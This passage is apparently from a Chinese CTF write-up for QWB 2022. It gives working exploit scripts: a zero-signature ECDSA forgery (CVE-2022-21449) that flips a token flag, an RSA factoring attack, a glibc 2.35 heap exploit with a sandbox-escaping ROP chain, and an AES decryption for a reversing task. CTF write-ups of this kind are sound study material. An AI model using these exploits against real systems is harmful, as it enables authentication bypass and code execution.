<p>相当于计算$x^{n-2}$，如果$x\ne0$，那么根据费马小定理（$n$为质数）<br>$$<br>x^{n-1}\equiv x\ (mod\ n)\notag<br>$$<br>那么<br>$$<br>x^{n-2}\equiv x^{-1}\ (mod\ n)\notag<br>$$<br>也就是说为了简化或者说提高效率，java使用费马小定理求逆元的，而且没有判断0，这样就造成了<br>$$<br>0^{n-2}\equiv 0\ (mod\ n)\notag<br>$$<br>$P\equiv 0\cdot G(z+rd)\ (mod\ n)\equiv 0\ (mod\ n)$</p>
<p>最终使得$r=x_P=0$验证通过</p>
</li>
<li><p>attack</p>
<p>这里如何实现将$r,s$都赋值为0？看CVE的demo是直接喂<code>\x00</code>的base64编码，不懂为什么，还没深究</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;47.104.76.78&#x27;</span>, <span class="number">23334</span>)</span><br><span class="line"></span><br><span class="line">fake_sig = <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">name = <span class="string">b&#x27;4xwi11&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, name)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">token = io.recvline().decode()[:-<span class="number">1</span>]</span><br><span class="line">head, payload, _ = token.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">payload = b64decode(payload).replace(<span class="string">b&#x27;false&#x27;</span>, <span class="string">b&#x27;true&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload_x = head.encode() + <span class="string">b&#x27;.&#x27;</span> + b64encode(payload) + <span class="string">b&#x27;.&#x27;</span> + b64encode(fake_sig)</span><br><span class="line">io.sendline(payload_x)</span><br><span class="line"><span class="built_in">print</span>(io.recvline()[:-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># b&#x27;your token:flag&#123;cve-2022-21449_Secur1ty_0f_c0de_1mplementation&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>btw，不知道是不是jdk版本的问题，我本地不行</p>
<h4 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h4><p>就完全是这篇论文的复现了<a href="https://eprint.iacr.org/2015/399.pdf">New attacks on RSA with Moduli N = p^rq</a>[6]</p>
<p>注意第一和第二种攻击中，用CopperSmith解小根就可以得到相应的未知数</p>
<p><img src="https://img-blog.csdnimg.cn/ba522a2cc8644ae2a0fbe23904048738.png" alt="image-20220731171326864"></p>
<p><img src="https://img-blog.csdnimg.cn/eb97a77a94d14b58a7cdb4bf369fcef2.png" alt="image-20220731171300864"></p>
<p>完整的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve m1, m2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_m1_m2</span>():</span></span><br><span class="line">    n11 = <span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">    n12 = <span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">    e11 = <span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">    e12 = <span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line">    c11 = <span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">    c12 = <span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> sub_fraction(n11, n12):</span><br><span class="line">        q11, q12 = _[<span class="number">0</span>], _[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n11 % q11 == <span class="number">0</span> <span class="keyword">and</span> q12 != <span class="number">1</span>:</span><br><span class="line">            p11 = iroot(n11 // q11, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p12 = iroot(n12 // q12, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> p11 ** <span class="number">2</span> * q11 == n11</span><br><span class="line">            <span class="keyword">assert</span> p12 ** <span class="number">2</span> * q12 == n12</span><br><span class="line">            phi1 = p11 * (p11 - <span class="number">1</span>) * (q11 - <span class="number">1</span>)</span><br><span class="line">            phi2 = p12 * (p12 - <span class="number">1</span>) * (q12 - <span class="number">1</span>)</span><br><span class="line">            d1 = invert(e11, phi1)</span><br><span class="line">            d2 = invert(e12, phi2)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">pow</span>(c11, d1, n11), <span class="built_in">pow</span>(c12, d2, n12)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_b</span>():</span></span><br><span class="line">    n2 = <span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">    e2 = <span class="number">65537</span></span><br><span class="line">    c2 = <span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">    m1, m2 = solve_m1_m2()</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">    f = m1 * m2 * x - (m2 - m1)</span><br><span class="line">    f = f.monic()</span><br><span class="line">    root = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span> ^ <span class="number">1000</span>, beta=<span class="number">0.75</span>)[<span class="number">0</span>])</span><br><span class="line">    p2 = gcd(<span class="built_in">int</span>(f(root)), n2)</span><br><span class="line">    p2 = iroot(p2, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">    q2 = n2 // (p2 ** <span class="number">7</span>)</span><br><span class="line">    phi2 = p2 ** <span class="number">6</span> * (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">    d2 = invert(e2, phi2)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve flag</span></span><br><span class="line">n3 = <span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3 = <span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">c3 = <span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line">b = solve_b()</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n3))</span><br><span class="line">f = e3 * x - <span class="built_in">int</span>(b)</span><br><span class="line">f = f.monic()</span><br><span class="line">root = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span> ^ <span class="number">675</span>, beta=<span class="number">0.75</span>)[<span class="number">0</span>])</span><br><span class="line">p3 = gcd(<span class="built_in">int</span>(f(root)), n3)</span><br><span class="line">p3 = iroot(p3, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">q3 = n3 // p3 ** <span class="number">7</span></span><br><span class="line">phi3 = p3 ** <span class="number">6</span> * (p3 - <span class="number">1</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = invert(e3, phi3)</span><br><span class="line">m = <span class="built_in">pow</span>(c3, d3, n3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="houseofcat"><a href="#houseofcat" class="headerlink" title="houseofcat"></a>houseofcat</h4><ul>
<li>首先逆向进入程序主逻辑先LOGIN |LOGIN r00t QWB QWXFadmin\x00 然后再CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff 就能进入菜单</li>
<li>进入菜单发现free那里是uaf漏洞，add函数里是只能申请0x418到0x46f大小的堆块，再结合给的libc是2.35版本没有free_hook所以大致攻击就是利用house ofemma，但是edit只有两次的修改的机会，利用两次largebinattack修改stderr伪造假的iofile然后改guard为堆地址。再是修改topchunk，我利用unsortedbin会合并的特点实现了一个堆重叠，从而可以伪造size位再次free之后就能有一个更大的假堆块，再修改topchunk的size触发houseofkiwi再实现houseofemma的调用链。由于开了沙箱，而且read的fd只能为0，发现沙箱有close函数就利用close将0关闭再通过open就能使fd为0然后得到flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#encoding: utf-8</span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import*</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">binary_name = &quot;house_of_cat&quot;</span><br><span class="line">libc_name = &quot;libc-2.35.so&quot;</span><br><span class="line">ld_name = &quot;ld&quot;</span><br><span class="line">local = 1</span><br><span class="line">version = &quot;3&quot;</span><br><span class="line">elf =ELF(&quot;./&quot;+binary_name)</span><br><span class="line">libc = ELF(&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;.format(libc_name,version,libc_name))</span><br><span class="line">#ld = ELF(&quot;./&quot;+ld_name)</span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4, b&#x27;\x00&#x27;))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">info    = lambda tag, addr          :log.info(tag + &quot; -------------&gt; &quot; + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line">if local==1:</span><br><span class="line">	io = remote(&quot;47.93.187.169&quot;,36038)</span><br><span class="line">else:</span><br><span class="line">	io = process(&quot;./&quot;+binary_name)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,&#x27;&#x27;&#x27;</span><br><span class="line">		b _IO_cookie_write</span><br><span class="line"></span><br><span class="line">		&#x27;&#x27;&#x27;)</span><br><span class="line">	pause()</span><br><span class="line">def ROL(content, key):</span><br><span class="line">    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    return int(tmp[key:] + tmp[:key], 2)</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))  #0x418 - 0x46f</span><br><span class="line">	sla(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	sla(&quot;content:\n&quot;,content)</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;4&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	sla(&quot;content:\n&quot;,content)</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def free(idx):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;2&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(&quot;choice:\n&quot;,&#x27;3&#x27;)</span><br><span class="line">	sla(&quot;idx:\n&quot;,str(idx))</span><br><span class="line">	</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;LOGIN |LOGIN r00t QWB QWXFadmin\x00&quot;)</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x78 + p64(0x7ffff7faea60)</span><br><span class="line">add(0,0x420,payload)</span><br><span class="line">add(0xf,0x420,&quot;aaa&quot;)</span><br><span class="line">add(1,0x418,&#x27;cccc&#x27;)</span><br><span class="line">add(0xe,0x418,&quot;ssss&quot;)</span><br><span class="line">free(0)</span><br><span class="line">add(2,0x430,&quot;ddd&quot;)</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;Context:\n&quot;)</span><br><span class="line">libcbase = uu64(io.recv(6)) - 2203856</span><br><span class="line">info(&quot;libcbase&quot;,libcbase)</span><br><span class="line">rc(10)</span><br><span class="line">heap_addr = uu64(io.recv(6))</span><br><span class="line">info(&quot;heap_addr&quot;,heap_addr)</span><br><span class="line">sla(&quot;mew mew mew~~~~~~&quot;,&quot;CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff&quot;)</span><br><span class="line">stderr_addr = libcbase + libc.sym[&quot;stderr&quot;]</span><br><span class="line">info(&quot;stderr_addr&quot;,stderr_addr)</span><br><span class="line">payload = p64(0)*2 + p64(0)+p64(libcbase-10432-0x20+0x30)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0) + p64(0x71)+p64(0)*13+p64(0x21)</span><br><span class="line">add(3,0x430,payload)</span><br><span class="line">##</span><br><span class="line">pop_rdi_ret = libcbase + 0x000000000002a3e5</span><br><span class="line">pop_rsi_ret = libcbase + 0x000000000002be51</span><br><span class="line">pop_rdx_r12_ret = libcbase + 0x000000000011f497</span><br><span class="line">ret_addr = libcbase  + 0x0000000000029cd6</span><br><span class="line">gadget = libcbase + 0x00000000001675b0 #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br><span class="line">setcontext = libcbase + libc.sym[&quot;setcontext&quot;] + 61 </span><br><span class="line"></span><br><span class="line">info(&quot;setcontext&quot;,setcontext)</span><br><span class="line">_IO_stdfile_2_lock = libcbase + 2210400</span><br><span class="line">info(&quot;_IO_stdfile_2_lock&quot;,_IO_stdfile_2_lock)</span><br><span class="line">## </span><br><span class="line">next_chain = 0</span><br><span class="line">srop_addr = heap_addr + 0x2ae0 + 0x10</span><br><span class="line">fake_IO_FILE = 2 * p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_write_base = 0</span><br><span class="line">fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_base</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_end</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heap_addr) # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase + 2186112 + 0x40)  # vtable</span><br><span class="line">fake_IO_FILE += p64(heap_addr+2400)  # rdi</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget ^ (heap_addr), 0x11))</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">syscall_ret = libcbase + 0x0000000000091396</span><br><span class="line">pop_rax_ret =libcbase + 0x0000000000045eb0</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0x100</span><br><span class="line">frame.rsp = heap_addr +2704</span><br><span class="line">frame.rip = pop_rdi_ret + 1  # : ret</span><br><span class="line">##orw</span><br><span class="line">flag_addr = heap_addr+2688</span><br><span class="line">read_addr = libcbase + libc.sym[&quot;read&quot;]</span><br><span class="line">write_addr = libcbase + libc.sym[&quot;write&quot;] </span><br><span class="line">close_addr =libcbase + libc.sym[&quot;close&quot;]</span><br><span class="line">orw =flat([</span><br><span class="line">	pop_rdi_ret,0,close_addr,</span><br><span class="line">	pop_rdi_ret,flag_addr,</span><br><span class="line">	pop_rax_ret,2,syscall_ret,</span><br><span class="line">    pop_rdi_ret,0,pop_rsi_ret,heap_addr+3232,pop_rdx_r12_ret,0x100,0,read_addr,</span><br><span class="line">	pop_rdi_ret,1,pop_rsi_ret,heap_addr+3232,pop_rdx_r12_ret,0x100,0,pop_rax_ret,1,write_addr</span><br><span class="line">	])</span><br><span class="line">payload = &quot;aaaaaaaa&quot;+p64(0)+p64(heap_addr+2400)+p64(0)*2+p64(setcontext)+str(frame)[0x28:].ljust(0xF8, &#x27;\x00&#x27;)+&#x27;flag&#x27;.ljust(0x10, &#x27;\x00&#x27;) + orw</span><br><span class="line">add(4,0x418,fake_IO_FILE+payload)</span><br><span class="line">free(4)</span><br><span class="line">payload = p64(0)*3+p64(libcbase+libc.sym[&#x27;stderr&#x27;]-0x20)</span><br><span class="line">edit(0,payload)</span><br><span class="line">add(5,0x430,&quot;payload&quot;)</span><br><span class="line">payload = p64(0)*3+p64(0x71)+p64(0)*12+p64(0)+p64(0x21)</span><br><span class="line">add(6,0x430,payload)</span><br><span class="line">free(2)</span><br><span class="line">info(&quot;x&quot;,heap_addr+5344)</span><br><span class="line">free(3)</span><br><span class="line">payload = &quot;\x00&quot;*0x430+p64(0)+p64(0x8a1)</span><br><span class="line">add(7,0x460,payload)</span><br><span class="line">free(3)</span><br><span class="line">info(&quot;top&quot;,heap_addr+7520)</span><br><span class="line">free(6)</span><br><span class="line">add(8,0x430,&quot;aaa&quot;)</span><br><span class="line">payload = &#x27;\x00&#x27;*0x438 + p64(0x80)</span><br><span class="line">add(9,0x440,payload)</span><br><span class="line">#debug()</span><br><span class="line">sla(&quot;choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">sla(&quot;idx:\n&quot;,&#x27;10&#x27;)  </span><br><span class="line">sla(&#x27;size:\n&#x27;,str(0x460))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="flag-值"><a href="#flag-值" class="headerlink" title="flag 值"></a>flag 值</h6><p>flag{e672697f-6e0f-4ebc-aa7f-c941cf974afa}</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="GameMaster"><a href="#GameMaster" class="headerlink" title="GameMaster"></a>GameMaster</h4><p>将exe文件拖入dnSpy进行反编译</p>
<p><img src="https://img-blog.csdnimg.cn/3c62eedab0f94143b23dab3b3415a118.png"></p>
<p>分析代码，先进行异或操作，然后再进行aes解密</p>
<p><img src="https://img-blog.csdnimg.cn/8a451e5d575e472d9493c44b161fea0d.png"></p>
<p><img src="https://img-blog.csdnimg.cn/69b9a5eeb3df48a9a6aa7bc9fc83ac73.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\gx\Downloads\GameMaster\gamemessage&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line">key=<span class="string">b&#x27;qwb2022BlackJack&#x27;</span></span><br><span class="line">iv=<span class="string">b&#x27;Brainstorming!!!&#x27;</span></span><br><span class="line">a=AES.new(iv,mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=a.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(m)</span><br></pre></td></tr></table></figure>



<p>解出来之后foremost，得到一个新的dll</p>
<p><img src="https://img-blog.csdnimg.cn/40df83916a0d44a9b169e93d98173b98.png"></p>
<p>再拖到dnSpy进行反汇编，分析代码</p>
<p><img src="https://s2.loli.net/2022/07/31/5G7onEyjKaiRQWm.png"></p>
<p>写出解密脚本得到flag</p>
